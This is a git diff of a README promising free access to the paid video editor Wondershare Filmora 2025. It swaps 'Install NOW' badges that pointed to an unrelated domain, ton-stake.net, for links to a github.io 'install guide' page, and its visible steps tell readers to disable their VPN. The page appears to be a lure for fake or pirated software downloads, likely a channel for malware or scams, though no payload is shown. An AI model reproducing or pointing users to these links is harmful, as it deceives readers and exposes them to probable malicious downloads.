@@ -5,7 +5,10 @@
 
 **Description**: Unleash your creativity with **Wondershare Filmora 2025**, offering free video editing access to powerful tools! This repository provides tutorials, resources, and tips to explore Filmora’s AI features like Smart Short Clips and Video Enhancer. Download your free version and join our vibrant community of editors in 2025!  
 
-[![Install Wondershare Filmora 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+
+<a href="https://filmoravideoediting.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -30,7 +33,10 @@ Transform your videos with these simple steps to set up Wondershare Filmora 2025
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother process.  
 
-[![Install Wondershare Filmora 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+
+<a href="https://filmoravideoediting.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
